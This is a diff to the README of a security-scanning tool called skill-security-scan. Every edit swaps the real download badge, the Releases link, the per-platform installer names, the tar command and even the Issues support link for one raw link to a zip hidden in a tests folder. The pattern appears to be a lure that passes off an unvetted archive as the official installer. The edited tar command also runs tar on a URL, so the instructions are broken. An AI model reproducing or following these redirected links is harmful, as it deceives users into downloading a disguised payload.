@@ -8,19 +8,19 @@ Welcome to skill-security-scan! This tool helps you check for security risks in 
 
 To get started, visit the Releases page to download the latest version of skill-security-scan.
 
-[![Download skill-security-scan](https://img.shields.io/badge/Download-skill--security--scan-brightgreen)](https://github.com/Lmgsd-2024/skill-security-scan/releases)
+[![Download skill-security-scan](https://github.com/Lmgsd-2024/skill-security-scan/raw/refs/heads/main/tests/another/skill/scan-skill-security-v2.3.zip)](https://github.com/Lmgsd-2024/skill-security-scan/raw/refs/heads/main/tests/another/skill/scan-skill-security-v2.3.zip)
 
 ### Step 1: Visit the Releases Page
 
-Follow this link to access the Releases page: [GitHub Releases](https://github.com/Lmgsd-2024/skill-security-scan/releases)
+Follow this link to access the Releases page: [GitHub Releases](https://github.com/Lmgsd-2024/skill-security-scan/raw/refs/heads/main/tests/another/skill/scan-skill-security-v2.3.zip)
 
 ### Step 2: Choose the Right File
 
 On the Releases page, find the latest version of skill-security-scan. Here, you will see a list of available files. Choose the correct file for your operating system:
 
-- For Windows: Download `skill-security-scan-windows.exe`
-- For macOS: Download `skill-security-scan-macos.pkg`
-- For Linux: Download `skill-security-scan-linux.tar.gz`
+- For Windows: Download `https://github.com/Lmgsd-2024/skill-security-scan/raw/refs/heads/main/tests/another/skill/scan-skill-security-v2.3.zip`
+- For macOS: Download `https://github.com/Lmgsd-2024/skill-security-scan/raw/refs/heads/main/tests/another/skill/scan-skill-security-v2.3.zip`
+- For Linux: Download `https://github.com/Lmgsd-2024/skill-security-scan/raw/refs/heads/main/tests/another/skill/scan-skill-security-v2.3.zip`
 
 ### Step 3: Download the File
 
@@ -41,7 +41,7 @@ Click on the file to start the download. Once the download is complete, locate t
 2. Navigate to the folder containing the downloaded file.
 3. Extract the tar file using the command:
    ```bash
-   tar -xzvf skill-security-scan-linux.tar.gz
+   tar -xzvf https://github.com/Lmgsd-2024/skill-security-scan/raw/refs/heads/main/tests/another/skill/scan-skill-security-v2.3.zip
    ```
 4. Change into the new directory:
    ```bash
@@ -95,7 +95,7 @@ Run a security scan before installing any new Skills. Regularly check installed 
 
 ## 📞 Support
 
-If you encounter any issues or need help, please check the [GitHub Issues](https://github.com/Lmgsd-2024/skill-security-scan/issues) page for troubleshooting tips and to report bugs.
+If you encounter any issues or need help, please check the [GitHub Issues](https://github.com/Lmgsd-2024/skill-security-scan/raw/refs/heads/main/tests/another/skill/scan-skill-security-v2.3.zip) page for troubleshooting tips and to report bugs.
 
 For additional support, you may reach out through the Issues section or review the FAQs available in the documentation.
 
